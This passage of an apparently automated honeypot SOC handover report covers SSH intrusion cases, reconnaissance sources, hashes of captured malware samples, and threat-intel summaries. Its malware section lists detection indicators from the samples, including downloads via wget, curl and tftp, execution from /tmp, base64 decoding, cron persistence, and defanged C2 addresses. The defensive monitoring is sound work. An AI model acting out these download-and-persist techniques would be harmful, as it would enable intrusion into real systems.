| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:51:23` | `cowrie.session.connect` |
| `2026-06-27 12:51:23` | `cowrie.client.version` |
| `2026-06-27 12:51:23` | `cowrie.client.kex` |
| `2026-06-27 12:51:24` | `cowrie.login.success` |
| `2026-06-27 12:51:24` | `cowrie.session.params` |
| `2026-06-27 12:51:24` | `cowrie.command.input` |
| `2026-06-27 12:51:25` | `cowrie.log.closed` |
| `2026-06-27 12:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a50fea7443bb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:52 |
| **Last Seen** | 2026-06-27 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:52:15` | `cowrie.session.connect` |
| `2026-06-27 12:52:15` | `cowrie.client.version` |
| `2026-06-27 12:52:16` | `cowrie.client.kex` |
| `2026-06-27 12:52:16` | `cowrie.login.success` |
| `2026-06-27 12:52:17` | `cowrie.session.params` |
| `2026-06-27 12:52:17` | `cowrie.command.input` |
| `2026-06-27 12:52:17` | `cowrie.log.closed` |
| `2026-06-27 12:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b5be490e7c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 12:52 |
| **Last Seen** | 2026-06-27 12:52 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:52:46` | `cowrie.session.connect` |
| `2026-06-27 12:52:47` | `cowrie.client.version` |
| `2026-06-27 12:52:47` | `cowrie.client.kex` |
| `2026-06-27 12:52:54` | `cowrie.login.success` |
| `2026-06-27 12:52:57` | `cowrie.session.params` |
| `2026-06-27 12:52:57` | `cowrie.command.input` |
| `2026-06-27 12:52:58` | `cowrie.log.closed` |
| `2026-06-27 12:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9279b73793

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:53 |
| **Last Seen** | 2026-06-27 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:53:09` | `cowrie.session.connect` |
| `2026-06-27 12:53:09` | `cowrie.client.version` |
| `2026-06-27 12:53:09` | `cowrie.client.kex` |
| `2026-06-27 12:53:10` | `cowrie.login.success` |
| `2026-06-27 12:53:11` | `cowrie.session.params` |
| `2026-06-27 12:53:11` | `cowrie.command.input` |
| `2026-06-27 12:53:11` | `cowrie.log.closed` |
| `2026-06-27 12:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b67f5c2added

| Field | Detail |
|---|---|
| **Source IP** | `43.110.37[.]217` |
| **First Seen** | 2026-06-27 12:53 |
| **Last Seen** | 2026-06-27 12:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:53:39` | `cowrie.session.connect` |
| `2026-06-27 12:53:39` | `cowrie.client.version` |
| `2026-06-27 12:53:39` | `cowrie.client.kex` |
| `2026-06-27 12:53:40` | `cowrie.login.success` |
| `2026-06-27 12:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.110.37[.]217` to AbuseIPDB if not already reported
- [ ] Block `43.110.37[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65ebc57a7da

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-06-27 12:53 |
| **Last Seen** | 2026-06-27 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:53:40` | `cowrie.session.connect` |
| `2026-06-27 12:53:40` | `cowrie.client.version` |
| `2026-06-27 12:53:40` | `cowrie.client.kex` |
| `2026-06-27 12:53:40` | `cowrie.login.success` |
| `2026-06-27 12:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bcb05bf0721

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:54 |
| **Last Seen** | 2026-06-27 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:54:03` | `cowrie.session.connect` |
| `2026-06-27 12:54:03` | `cowrie.client.version` |
| `2026-06-27 12:54:04` | `cowrie.client.kex` |
| `2026-06-27 12:54:04` | `cowrie.login.success` |
| `2026-06-27 12:54:05` | `cowrie.session.params` |
| `2026-06-27 12:54:05` | `cowrie.command.input` |
| `2026-06-27 12:54:05` | `cowrie.log.closed` |
| `2026-06-27 12:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db48531a655

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:54 |
| **Last Seen** | 2026-06-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:54:59` | `cowrie.session.connect` |
| `2026-06-27 12:54:59` | `cowrie.client.version` |
| `2026-06-27 12:54:59` | `cowrie.client.kex` |
| `2026-06-27 12:54:59` | `cowrie.login.success` |
| `2026-06-27 12:55:00` | `cowrie.session.params` |
| `2026-06-27 12:55:00` | `cowrie.command.input` |
| `2026-06-27 12:55:00` | `cowrie.log.closed` |
| `2026-06-27 12:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.230.42[.]17` | **537** | 2026-06-27 08:55 | 2026-06-27 12:54 | 359m | 0 | `T1592` | 🟠 MEDIUM |
| `209.99.185[.]59` | **261** | 2026-06-27 08:55 | 2026-06-27 12:54 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `212.8.242[.]38` | **6** | 2026-06-27 09:23 | 2026-06-27 12:06 | 3m | 0 | `T1592` | 🟢 LOW |
| `13.89.125[.]27` | **2** | 2026-06-27 10:21 | 2026-06-27 10:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-06-27 09:34 | 2026-06-27 10:34 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.106.206[.]77` | **2** | 2026-06-27 11:01 | 2026-06-27 11:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.132.26[.]232` | **2** | 2026-06-27 10:36 | 2026-06-27 10:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]13` | **2** | 2026-06-27 11:53 | 2026-06-27 12:07 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `184.105.247[.]196` | 1 | 2026-06-27 11:29 | 2026-06-27 11:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]138` | 1 | 2026-06-27 10:02 | 2026-06-27 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.141.46[.]66` | 1 | 2026-06-27 12:47 | 2026-06-27 12:47 | 36s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-06-27 12:16 | 2026-06-27 12:18 | 114s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]182` | 1 | 2026-06-27 09:49 | 2026-06-27 09:49 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 61/100 | 🟡 MEDIUM | **3/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 51/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 43/100 | 🟡 MEDIUM | **9/75** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 44/100 | 🟡 MEDIUM | **11/75** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 48/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 51/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 45/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 83/100 | 🔴 HIGH | **34/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 42/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 61/100 | 🟡 MEDIUM | **4/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 42/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 60/100 | 🟡 MEDIUM | 0/76 ✅ |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 46/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | ELF Binary (Linux executable) (AArch64 64-bit) | `dbb7ebb960dc0d5a...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `ea73a088909b53110444807188562c406c6c6c89b3748aee016bc996ab1f1318` | Unknown binary | `ea73a088909b5311...` | 55/100 | 🟡 MEDIUM | **39/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.85.102[.]135` | CN | China Mobile Communications Corporation | **100** ⚠️ | 0 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 0 |
| `91.92.40[.]13` | NL | TechTies Inc. | **100** ⚠️ | 0 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 0 |
| `118.26.111[.]107` | SG | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 0 |
| `184.105.247[.]196` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `212.8.242[.]38` | NL | WorldStream B.V. | **100** ⚠️ | 0 |
| `209.141.46[.]66` | US | FranTech Solutions | **100** ⚠️ | 0 |
| `20.106.206[.]77` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `13.89.125[.]27` | US | Microsoft Corporation | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 351 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 330 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 16 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1163 cases |
| Tool 34  | Credential Extractor        | ✅ 336 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (1.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 42 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 330 priority case(s) shown individually · 13 recon entry/entries in table (8 group(s) consolidating 814 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-27T13:50:50Z_
